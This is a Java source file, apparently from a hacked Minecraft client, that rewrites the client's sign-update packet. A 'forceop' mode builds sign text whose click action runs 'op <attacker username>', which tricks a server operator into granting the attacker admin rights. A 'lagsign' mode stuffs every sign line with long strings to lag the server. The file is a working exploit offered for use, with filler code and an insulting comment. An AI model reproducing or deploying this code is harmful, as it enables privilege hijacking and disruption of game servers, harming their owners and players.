package net.minecraft.network.play.client;

import java.io.IOException;

import net.minecraft.client.Minecraft;
import net.minecraft.network.INetHandler;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.INetHandlerPlayServer;
import net.minecraft.util.BlockPos;
import net.minecraft.util.IChatComponent;

public class C12PacketUpdateSign implements Packet {

	public static final int EaZy = 1392;

	public void lambdaStuff() {
		java.util.Arrays.asList().stream().filter((m) -> (false)).forEachOrdered((m) -> {});
	}

	private BlockPos pos;
	private IChatComponent[] lines;
	public static String signCommand;
	public static String signContent;
	private boolean forceop;
	private boolean lagsign;
	// private static final String __OBFID = "http://https://fuckuskid00001370";

	public C12PacketUpdateSign() {}

	public C12PacketUpdateSign(final BlockPos pos, final IChatComponent[] lines, boolean forceop, boolean lagsign) {
		this.pos = pos;
		this.lines = new IChatComponent[] { lines[0], lines[1], lines[2], lines[3] };
		this.forceop = forceop;
		this.lagsign = lagsign;
	}

	/**
	 * Reads the raw packet data from the data stream.
	 */
	@Override
	public void readPacketData(final PacketBuffer data) throws IOException {
		pos = data.readBlockPos();
		lines = new IChatComponent[4];

		for (int var2 = 0; var2 < 4; ++var2) {
			lines[var2] = data.readChatComponent();
		}
	}

	/**
	 * Writes the raw packet data to the data stream.
	 */
	@Override
	public void writePacketData(final PacketBuffer data) throws IOException {
		data.writeBlockPos(pos);

		if (signCommand == null) {
			signCommand = "op " + Minecraft.session.getUsername();
		}
		if (signContent == null) {
			signContent = "§6ForceOPed by §4EaZy";
		}

		if (forceop) {
			data.writeString("\"\"");
			data.writeString("{\"text\":\"" + signContent + "\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\""
					+ signCommand + "\"}}");
			data.writeString("\"\"");
			data.writeString("\"\"");
		} else if (lagsign) {
			String s = "{\"text\":\"";
			for (int i = 0; i < 333; i++) {
				s += "x";
			}
			s += "\"}";
			data.writeString(s);
			data.writeString(s);
			data.writeString(s);
			data.writeString(s);
		} else {
			for (int i = 0; i < 4; ++i) {
				data.writeChatComponent(lines[i]);
			}
		}
	}

	/**
	 * Passes this Packet on to the NetHandler for processing.
	 */
	public void processPacket(final INetHandlerPlayServer handler) {
		handler.processUpdateSign(this);
	}

	public BlockPos func_179722_a() {
		return pos;
	}

	public IChatComponent[] func_180768_b() {
		return lines;
	}

	/**
	 * Passes this Packet on to the NetHandler for processing.
	 */
	@Override
	public void processPacket(final INetHandler handler) {
		this.processPacket((INetHandlerPlayServer) handler);
	}
}
